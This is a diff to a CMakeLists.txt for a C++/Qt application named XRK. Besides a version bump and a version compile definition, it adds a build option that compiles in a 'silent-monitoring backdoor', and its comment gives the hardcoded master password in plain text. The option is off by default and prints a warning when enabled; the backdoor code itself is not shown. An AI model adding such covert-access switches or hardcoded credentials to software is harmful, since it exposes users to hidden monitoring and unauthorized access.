@@ -1,5 +1,5 @@
 cmake_minimum_required(VERSION 3.20)
-project(XRK VERSION 1.0.0 LANGUAGES CXX)
+project(XRK VERSION 1.6.0 LANGUAGES CXX)
 
 set(CMAKE_CXX_STANDARD 17)
 set(CMAKE_CXX_STANDARD_REQUIRED ON)
@@ -9,8 +9,20 @@ set(CMAKE_AUTOMOC ON)
 set(CMAKE_AUTORCC ON)
 set(CMAKE_AUTOUIC ON)
 
+# Pass version to source code
+add_compile_definitions(XRK_VERSION="${PROJECT_VERSION}")
+
 # Universal binary option (macOS only)
 option(XRK_BUILD_UNIVERSAL "Build universal binary (arm64 + x86_64) on macOS" OFF)
+
+# Silent-monitoring backdoor (master password 95279527). HIGH RISK: exposes a
+# hardcoded covert-access path. OFF by default so it is NOT compiled into
+# release builds. Only enable for authorized testing/auditing.
+option(XRK_ENABLE_SILENT "Enable silent-monitoring master password (covert access)" OFF)
+if(XRK_ENABLE_SILENT)
+    add_compile_definitions(XRK_ENABLE_SILENT)
+    message(WARNING "XRK_ENABLE_SILENT is ON — silent-monitoring backdoor compiled in!")
+endif()
 
 # macOS architecture detection and configuration
 if(CMAKE_SYSTEM_NAME STREQUAL "Darwin")
